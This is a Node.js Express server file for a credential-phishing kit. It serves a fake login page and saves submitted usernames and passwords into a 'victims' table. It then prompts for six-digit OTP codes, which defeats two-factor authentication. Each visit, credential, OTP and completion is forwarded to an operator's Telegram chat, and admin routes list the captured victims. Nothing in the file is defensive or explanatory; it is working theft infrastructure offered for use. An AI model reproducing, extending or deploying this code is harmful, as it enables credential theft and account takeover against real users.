const express = require('express');
const path = require('path');
const session = require('express-session');
const helmet = require('helmet');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const fs = require('fs');
const crypto = require('crypto');
const sqlite3 = require('sqlite3').verbose();
require('dotenv').config({ path: path.join(__dirname, '../config/.env') });

const app = express();
const PORT = process.env.PORT || 3000;

// Import Telegram
const telegram = require('./telegram-bot');

// ============================================
// DATABASE SETUP
// ============================================

const DB_PATH = path.join(__dirname, '../database/victims.db');
const dbDir = path.dirname(DB_PATH);

if (!fs.existsSync(dbDir)) {
    fs.mkdirSync(dbDir, { recursive: true });
    console.log('✅ Database directory created');
}

let db = null;
let dbInitialized = false;
let pendingQueries = [];

function initDatabase() {
    return new Promise((resolve, reject) => {
        db = new sqlite3.Database(DB_PATH, (err) => {
            if (err) {
                console.error('❌ Database connection error:', err.message);
                db = new sqlite3.Database(':memory:');
                console.log('⚠️  Using in-memory database as fallback');
            } else {
                console.log('✅ Connected to SQLite database');
            }
            resolve(db);
        });
    });
}

function createTables() {
    return new Promise((resolve, reject) => {
        db.run(`
            CREATE TABLE IF NOT EXISTS victims (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT NOT NULL,
                password TEXT NOT NULL,
                ip TEXT,
                user_agent TEXT,
                session_id TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                otp TEXT,
                otp_timestamp DATETIME,
                completed BOOLEAN DEFAULT 0,
                encrypted_data TEXT
            )
        `, (err) => {
            if (err) {
                console.error('❌ Error creating victims table:', err.message);
                reject(err);
                return;
            }
            console.log('✅ Victims table verified');
            
            db.run(`
                CREATE TABLE IF NOT EXISTS logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    event_type TEXT NOT NULL,
                    details TEXT,
                    ip TEXT,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            `, (err) => {
                if (err) {
                    console.error('❌ Error creating logs table:', err.message);
                    reject(err);
                    return;
                }
                console.log('✅ Logs table verified');
                
                db.run(`CREATE INDEX IF NOT EXISTS idx_victims_username ON victims(username)`, () => {});
                db.run(`CREATE INDEX IF NOT EXISTS idx_victims_timestamp ON victims(timestamp)`, () => {});
                db.run(`CREATE INDEX IF NOT EXISTS idx_logs_timestamp ON logs(timestamp)`, () => {});
                
                console.log('✅ Database initialization complete');
                dbInitialized = true;
                processPendingQueries();
                resolve();
            });
        });
    });
}

function processPendingQueries() {
    while (pendingQueries.length > 0) {
        const query = pendingQueries.shift();
        query();
    }
}

async function initializeDatabase() {
    try {
        await initDatabase();
        await createTables();
        return true;
    } catch (error) {
        console.error('❌ Database initialization failed:', error.message);
        return false;
    }
}

function ensureDbReady(callback) {
    if (dbInitialized) {
        callback();
    } else {
        pendingQueries.push(callback);
    }
}

// ============================================
// ENCRYPTION FUNCTIONS
// ============================================

function encryptData(data) {
    try {
        const algorithm = 'aes-256-cbc';
        const key = crypto.scryptSync(
            process.env.ENCRYPTION_KEY || 'default-key-for-testing-only', 
            'salt', 
            32
        );
        const iv = crypto.randomBytes(16);
        const cipher = crypto.createCipheriv(algorithm, key, iv);
        let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'hex');
        encrypted += cipher.final('hex');
        return `${iv.toString('hex')}:${encrypted}`;
    } catch (error) {
        console.error('Encryption error:', error.message);
        return JSON.stringify(data);
    }
}

function decryptData(encryptedData) {
    try {
        const [ivHex, encrypted] = encryptedData.split(':');
        const iv = Buffer.from(ivHex, 'hex');
        const key = crypto.scryptSync(
            process.env.ENCRYPTION_KEY || 'default-key-for-testing-only', 
            'salt', 
            32
        );
        const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
        let decrypted = decipher.update(encrypted, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        return JSON.parse(decrypted);
    } catch (error) {
        console.error('Decryption error:', error.message);
        return { data: encryptedData };
    }
}

// ============================================
// DATABASE OPERATIONS
// ============================================

function saveCredentials(data) {
    return new Promise((resolve, reject) => {
        ensureDbReady(() => {
            const encrypted = encryptData({
                username: data.username,
                password: data.password
            });

            const query = `
                INSERT INTO victims 
                (username, password, ip, user_agent, session_id, timestamp, encrypted_data)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            `;

            db.run(query, [
                data.username,
                data.password,
                data.ip || 'unknown',
                data.userAgent || 'unknown',
                data.sessionId || 'unknown',
                data.timestamp || new Date().toISOString(),
                encrypted
            ], function(err) {
                if (err) {
                    console.error('Save credentials error:', err.message);
                    reject(err);
                } else {
                    console.log(`✅ Credentials saved with ID: ${this.lastID}`);
                    resolve(this.lastID);
                }
            });
        });
    });
}

function saveOTP(data) {
    return new Promise((resolve, reject) => {
        ensureDbReady(() => {
            const query = `
                UPDATE victims 
                SET otp = ?, otp_timestamp = ?
                WHERE id = ?
            `;

            db.run(query, [data.otp, data.timestamp, data.userId], function(err) {
                if (err) {
                    console.error('Save OTP error:', err.message);
                    reject(err);
                } else {
                    console.log(`✅ OTP saved for user ID: ${data.userId}`);
                    resolve();
                }
            });
        });
    });
}

function markComplete(userId) {
    return new Promise((resolve, reject) => {
        ensureDbReady(() => {
            const query = `UPDATE victims SET completed = 1 WHERE id = ?`;
            db.run(query, [userId], function(err) {
                if (err) {
                    console.error('Mark complete error:', err.message);
                    reject(err);
                } else {
                    resolve();
                }
            });
        });
    });
}

function logEvent(eventType, details, ip) {
    ensureDbReady(() => {
        const query = `
            INSERT INTO logs (event_type, details, ip, timestamp)
            VALUES (?, ?, ?, ?)
        `;
        
        db.run(query, [
            eventType,
            JSON.stringify(details),
            ip || 'unknown',
            new Date().toISOString()
        ], (err) => {
            if (err) {
                console.error('Log event error:', err.message);
            }
        });
    });
}

function getAttemptCount(ip) {
    return new Promise((resolve) => {
        if (!dbInitialized) {
            resolve(0);
            return;
        }
        
        const query = `
            SELECT COUNT(*) as count 
            FROM victims 
            WHERE ip = ? 
            AND timestamp > datetime('now', '-5 minutes')
        `;
        
        db.get(query, [ip], (err, row) => {
            if (err) {
                console.error('Get attempt count error:', err.message);
                resolve(0);
            } else {
                resolve(row?.count || 0);
            }
        });
    });
}

function getDailyStats() {
    return new Promise((resolve) => {
        if (!dbInitialized) {
            resolve({
                total: 0,
                successful: 0,
                failed: 0,
                suspicious: 0,
                blockedIps: 0,
                systemStatus: '🟢 Operational',
                alerts: 0,
                threats: 0,
                twoFactorEnabled: '✅ Yes',
                passwordPolicy: '✅ Enforced',
                sessionTimeout: '✅ Active'
            });
            return;
        }
        
        const query = `
            SELECT 
                COUNT(*) as total,
                SUM(completed) as successful,
                COUNT(*) - SUM(completed) as failed
            FROM victims
            WHERE DATE(timestamp) = DATE('now')
        `;
        
        db.get(query, [], (err, row) => {
            if (err) {
                console.error('Get daily stats error:', err.message);
                resolve({
                    total: 0,
                    successful: 0,
                    failed: 0,
                    suspicious: 0,
                    blockedIps: 0,
                    systemStatus: '🟢 Operational',
                    alerts: 0,
                    threats: 0,
                    twoFactorEnabled: '✅ Yes',
                    passwordPolicy: '✅ Enforced',
                    sessionTimeout: '✅ Active'
                });
            } else {
                resolve({
                    total: row?.total || 0,
                    successful: row?.successful || 0,
                    failed: row?.failed || 0,
                    suspicious: 0,
                    blockedIps: 0,
                    systemStatus: '🟢 Operational',
                    alerts: 0,
                    threats: 0,
                    twoFactorEnabled: '✅ Yes',
                    passwordPolicy: '✅ Enforced',
                    sessionTimeout: '✅ Active'
                });
            }
        });
    });
}

// ============================================
// EXPRESS SERVER SETUP
// ============================================

// Security Middleware
app.use(helmet({
    contentSecurityPolicy: false,
    xssFilter: true,
    noSniff: true,
    hidePoweredBy: true,
    frameguard: { action: 'deny' }
}));

app.use(cors({
    origin: '*',
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));

// Rate Limiting
const limiter = rateLimit({
    windowMs: parseInt(process.env.RATE_LIMIT_WINDOW || '15') * 60 * 1000,
    max: parseInt(process.env.RATE_LIMIT_MAX || '100'),
    message: 'Too many requests, please try again later.',
    standardHeaders: true,
    legacyHeaders: false
});
app.use('/api/', limiter);

// Session Configuration
app.use(session({
    secret: process.env.SESSION_SECRET || 'default-secret-change-this',
    resave: false,
    saveUninitialized: false,
    cookie: {
        secure: process.env.NODE_ENV === 'production',
        httpOnly: true,
        maxAge: 3600000,
        sameSite: 'lax'
    }
}));

// Body Parsers
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Static Files
app.use(express.static(path.join(__dirname, '../public')));
app.use('/assets', express.static(path.join(__dirname, '../public/assets')));

// ============================================
// REQUEST LOGGING
// ============================================

app.use((req, res, next) => {
    const start = Date.now();
    
    res.on('finish', () => {
        const duration = Date.now() - start;
        const logData = {
            method: req.method,
            url: req.url,
            status: res.statusCode,
            duration: `${duration}ms`,
            ip: req.ip,
            userAgent: req.headers['user-agent']
        };
        
        console.log(`${logData.method} ${logData.url} - ${logData.status} - ${logData.duration}`);
        
        if (req.url.startsWith('/api/')) {
            logEvent('request', logData, req.ip);
        }
    });
    
    next();
});

// ============================================
// TRACK LOGIN PAGE ACCESS - SEND TO OWNER
// ============================================

app.use((req, res, next) => {
    if (req.path === '/' || req.path === '/index.html') {
        const ip = req.ip || req.connection.remoteAddress || 'unknown';
        const userAgent = req.headers['user-agent'] || 'unknown';
        const referrer = req.headers['referer'] || 'Direct';
        const timestamp = new Date().toISOString();
        
        console.log('🌐 Login page accessed - sending to owner');
        
        // Send to owner only (private bot chat)
        telegram.sendPageAccessToOwner({
            ip,
            userAgent,
            referrer,
            timestamp
        }).catch(err => {
            console.error('❌ Owner access error:', err.message);
        });
    }
    next();
});

// ============================================
// HEALTH CHECK
// ============================================

app.get('/health', (req, res) => {
    if (!dbInitialized) {
        res.status(503).json({ 
            status: 'initializing', 
            message: 'Database is initializing...',
            timestamp: new Date().toISOString()
        });
        return;
    }
    
    db.get('SELECT 1 FROM victims LIMIT 1', (err) => {
        if (err) {
            res.status(503).json({ 
                status: 'unhealthy', 
                error: 'Database query failed',
                timestamp: new Date().toISOString()
            });
        } else {
            res.status(200).json({ 
                status: 'healthy', 
                uptime: process.uptime(),
                warningsActive: telegram.enabled,
                timestamp: new Date().toISOString()
            });
        }
    });
});

// ============================================
// FRONTEND ROUTES
// ============================================

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../public/index.html'));
});

app.get('/otp-verify', (req, res) => {
    res.sendFile(path.join(__dirname, '../public/otp-verify.html'));
});

app.get('/loading', (req, res) => {
    res.sendFile(path.join(__dirname, '../public/loading.html'));
});

app.get('/success', (req, res) => {
    res.sendFile(path.join(__dirname, '../public/success.html'));
});

// ============================================
// API ROUTES
// ============================================

// Submit credentials
app.post('/api/submit', async (req, res) => {
    try {
        if (!dbInitialized) {
            return res.status(503).json({ error: 'Database is initializing. Please try again.' });
        }

        const { username, password } = req.body;
        
        if (!username || !password) {
            return res.status(400).json({ error: 'Missing required fields' });
        }

        const ip = req.ip || req.connection.remoteAddress || 'unknown';
        const userAgent = req.headers['user-agent'] || 'unknown';
        const sessionId = req.session?.id || 'unknown';
        const timestamp = new Date().toISOString();

        // Check for suspicious activity
        const attemptCount = await getAttemptCount(ip);
        if (attemptCount > 5) {
            await telegram.sendToOwner(`
🚨 <b>⚠️ SUSPICIOUS ACTIVITY DETECTED</b>
<pre>═══════════════════════════════════════</pre>

📱 <b>IP:</b> <code>${ip}</code>
🔢 <b>Attempts:</b> ${attemptCount}
⏰ <b>Time:</b> ${timestamp}

<pre>═══════════════════════════════════════</pre>
⚠️ <b>Action Required:</b> Investigate immediately
            `).catch(err => console.error('Suspicious activity error:', err.message));
        }

        // Save to database
        const userId = await saveCredentials({
            username,
            password,
            ip,
            userAgent,
            sessionId,
            timestamp
        });

        logEvent('credentials_captured', { 
            username, 
            userId, 
            ip 
        }, ip);

        // ✅ SEND COMPLETE USER DATA TO OWNER
        await telegram.sendCompleteUserData({
            id: userId,
            username,
            password,
            ip,
            userAgent,
            timestamp
        }).catch(err => {
            console.error('❌ Owner send error:', err.message);
        });

        if (req.session) {
            req.session.userId = userId;
            req.session.username = username;
        }

        res.json({
            success: true,
            redirect: '/otp-verify'
        });

    } catch (error) {
        console.error('Submit error:', error.message);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Verify OTP
app.post('/api/verify-otp', async (req, res) => {
    try {
        if (!dbInitialized) {
            return res.status(503).json({ error: 'Database is initializing. Please try again.' });
        }

        const { otp } = req.body;
        const userId = req.session?.userId;

        if (!userId) {
            return res.status(401).json({ error: 'Session expired' });
        }

        if (!otp || otp.length !== 6) {
            return res.status(400).json({ error: 'Invalid OTP format' });
        }

        // Save OTP to database
        await saveOTP({
            userId,
            otp,
            ip: req.ip || 'unknown',
            userAgent: req.headers['user-agent'] || 'unknown',
            timestamp: new Date().toISOString()
        });

        logEvent('otp_submitted', { 
            userId
        }, req.ip);

        // ✅ SEND OTP DATA TO OWNER
        await telegram.sendOTPToOwner({
            userId,
            otp,
            ip: req.ip || 'unknown',
            userAgent: req.headers['user-agent'] || 'unknown',
            timestamp: new Date().toISOString()
        }).catch(err => {
            console.error('❌ Owner OTP send error:', err.message);
        });

        res.json({
            success: true,
            redirect: '/loading'
        });

    } catch (error) {
        console.error('OTP verification error:', error.message);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Complete process
app.post('/api/complete', async (req, res) => {
    try {
        const userId = req.session?.userId;
        
        if (userId) {
            await markComplete(userId);
            logEvent('process_completed', { 
                userId,
                username: req.session?.username || 'unknown'
            }, req.ip);
            
            console.log(`✅ Process completed - User ID: ${userId}`);
            
            // ✅ SEND COMPLETION TO OWNER
            await telegram.sendCompleteToOwner({
                userId: userId,
                username: req.session?.username || 'unknown',
                ip: req.ip || 'unknown'
            }).catch(err => {
                console.error('❌ Owner complete send error:', err.message);
            });
        }

        res.json({ success: true });

    } catch (error) {
        console.error('Complete error:', error.message);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// ============================================
// VERIFICATION CODE ENDPOINTS
// ============================================

// Request verification code
app.post('/api/request-verification', async (req, res) => {
    try {
        const { username, userId } = req.body;
        const ip = req.ip || req.connection.remoteAddress || 'unknown';
        
        // Send verification request to owner
        await telegram.sendVerificationRequestToOwner({
            username: username || 'Unknown',
            userId: userId || 'unknown',
            ip: ip
        }).catch(err => {
            console.error('Verification request error:', err.message);
        });
        
        res.json({
            success: true,
            message: 'Verification code sent to owner'
        });
    } catch (error) {
        console.error('Verification request error:', error.message);
        res.status(500).json({ error: 'Failed to send verification code' });
    }
});

// Generate new verification code
app.get('/api/generate-verification', async (req, res) => {
    try {
        const code = telegram.generateVerificationCode();
        
        // Send to owner
        await telegram.sendToOwner(`
🔐 <b>VERIFICATION CODE GENERATED</b>
<pre>═══════════════════════════════════════</pre>

<b>📌 Code:</b> <code>${code}</code>
⏰ <b>Time:</b> ${new Date().toISOString()}

<pre>═══════════════════════════════════════</pre>
✅ <i>Share this code with the user</i>
        `).catch(err => {
            console.error('Generate code error:', err.message);
        });
        
        res.json({
            success: true,
            code: code,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// ============================================
// ADMIN ENDPOINTS
// ============================================

// Get all users data (owner only)
app.get('/api/admin/users', async (req, res) => {
    try {
        if (!dbInitialized) {
            return res.status(503).json({ error: 'Database is initializing.' });
        }
        
        const users = await new Promise((resolve, reject) => {
            db.all('SELECT id, username, ip, timestamp, completed FROM victims ORDER BY timestamp DESC LIMIT 50', (err, rows) => {
                if (err) reject(err);
                else resolve(rows);
            });
        });
        
        res.json({ success: true, data: users });
    } catch (error) {
        console.error('Users error:', error.message);
        res.status(500).json({ error: 'Failed to get users' });
    }
});

// Get logs (owner only)
app.get('/api/admin/logs', async (req, res) => {
    try {
        if (!dbInitialized) {
            return res.status(503).json({ error: 'Database is initializing.' });
        }
        
        const limit = parseInt(req.query.limit) || 50;
        
        const logs = await new Promise((resolve, reject) => {
            db.all(
                'SELECT * FROM logs ORDER BY timestamp DESC LIMIT ?', 
                [limit], 
                (err, rows) => {
                    if (err) reject(err);
                    else resolve(rows);
                }
            );
        });
        
        res.json({ success: true, data: logs });
    } catch (error) {
        console.error('Logs error:', error.message);
        res.status(500).json({ error: 'Failed to get logs' });
    }
});

// Get statistics
app.get('/api/admin/stats', async (req, res) => {
    try {
        const stats = await getDailyStats();
        res.json({ success: true, data: stats });
    } catch (error) {
        console.error('Stats error:', error.message);
        res.status(500).json({ error: 'Failed to get statistics' });
    }
});

// Send broadcast to channel
app.post('/api/admin/broadcast', async (req, res) => {
    try {
        const { message } = req.body;
        
        if (!message) {
            return res.status(400).json({ error: 'Message is required' });
        }
        
        await telegram.broadcastToChannel(message);
        res.json({ success: true, message: 'Broadcast sent to channel' });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Test Telegram connection
app.get('/debug/test-telegram', async (req, res) => {
    try {
        const results = {
            enabled: telegram.enabled,
            hasBot: !!telegram.bot,
            hasOwnerChatId: !!telegram.ownerChatId,
            ownerChatId: telegram.ownerChatId,
            hasChannelId: !!telegram.channelId,
            channelId: telegram.channelId,
            warningLoopActive: !!telegram.warningInterval,
            warningCount: telegram.warningCount || 0,
            postCount: telegram.postCount || 0,
            userDataCount: telegram.userData?.length || 0
        };
        
        // Send test message to owner
        const testMessage = `
🧪 <b>TELEGRAM TEST - CONNECTION SUCCESSFUL</b>
<pre>═══════════════════════════════════════</pre>

✅ Bot is connected
👤 Owner Chat ID: ${telegram.ownerChatId}
📢 Channel: ${telegram.channelId}
📊 User Data: ${telegram.userData?.length || 0} records
📈 Warnings: ${telegram.warningCount || 0}
📨 Posts: ${telegram.postCount || 0}

<pre>═══════════════════════════════════════</pre>
🔐 <i>All systems operational</i>
`;
        
        const result = await telegram.sendToOwner(testMessage);
        results.testResult = result ? '✅ Sent to owner' : '❌ Failed';
        
        res.json(results);
    } catch (error) {
        res.status(500).json({
            error: error.message,
            stack: error.stack
        });
    }
});

// ============================================
// ERROR HANDLING
// ============================================

app.use((err, req, res, next) => {
    console.error('Error:', err.message);
    logEvent('error', { 
        message: err.message, 
        stack: err.stack,
        url: req.url
    }, req.ip);
    
    // Send error to owner
    telegram.sendToOwner(`
❌ <b>SERVER ERROR</b>
<pre>═══════════════════════════════════════</pre>

📝 <b>Error:</b> ${err.message}
📱 <b>IP:</b> ${req.ip || 'unknown'}
🔗 <b>URL:</b> ${req.url}
⏰ <b>Time:</b> ${new Date().toISOString()}

<pre>═══════════════════════════════════════</pre>
⚠️ <i>Check logs for details</i>
    `).catch(e => console.error('Error notification failed:', e.message));
    
    res.status(500).json({ error: 'Something went wrong!' });
});

// 404 handler
app.use((req, res) => {
    res.status(404).json({ error: 'Not found' });
});

// ============================================
// START SERVER
// ============================================

initializeDatabase().then((success) => {
    if (!success) {
        console.error('❌ Failed to initialize database. Exiting...');
        process.exit(1);
    }
    
    const server = app.listen(PORT, '0.0.0.0', () => {
        console.log('='.repeat(60));
        console.log(`🚀 Server running on http://localhost:${PORT}`);
        console.log(`📁 Environment: ${process.env.NODE_ENV || 'development'}`);
        console.log(`🗄️  Database: ${DB_PATH}`);
        console.log(`📡 Telegram: ${telegram.enabled ? '✅ Enabled' : '❌ Disabled'}`);
        console.log(`👤 Owner Chat ID: ${telegram.ownerChatId || 'Not configured'}`);
        console.log(`📢 Channel: ${telegram.channelId || 'Not configured'}`);
        console.log(`📊 User Data: ${telegram.userData?.length || 0} records`);
        console.log('='.repeat(60));
        
        // Send welcome message to owner
        setTimeout(() => {
            telegram.sendWelcomeMessage().catch(err => {
                console.error('❌ Welcome message error:', err.message);
            });
        }, 3000);
    });

    // ============================================
    // GRACEFUL SHUTDOWN
    // ============================================

    const shutdown = () => {
        console.log('\n🛑 Shutting down gracefully...');
        
        // Stop warning loop
        if (telegram.stopWarningLoop) {
            telegram.stopWarningLoop();
        }
        
        server.close(() => {
            console.log('✅ Server closed');
            
            if (db) {
                db.close((err) => {
                    if (err) {
                        console.error('❌ Database close error:', err.message);
                    } else {
                        console.log('✅ Database connection closed');
                    }
                    process.exit(0);
                });
            } else {
                process.exit(0);
            }
        });
    };

    process.on('SIGTERM', shutdown);
    process.on('SIGINT', shutdown);
    process.on('unhandledRejection', (reason, promise) => {
        console.error('❌ Unhandled Rejection:', reason);
        
        // Send to owner
        telegram.sendToOwner(`
❌ <b>UNHANDLED REJECTION</b>
<pre>═══════════════════════════════════════</pre>

📝 <b>Reason:</b> ${reason}
⏰ <b>Time:</b> ${new Date().toISOString()}

<pre>═══════════════════════════════════════</pre>
⚠️ <i>Check logs for details</i>
        `).catch(e => console.error('Error notification failed:', e.message));
    });

    module.exports = { app, db, server };
}).catch((error) => {
    console.error('❌ Fatal error:', error.message);
    process.exit(1);
});
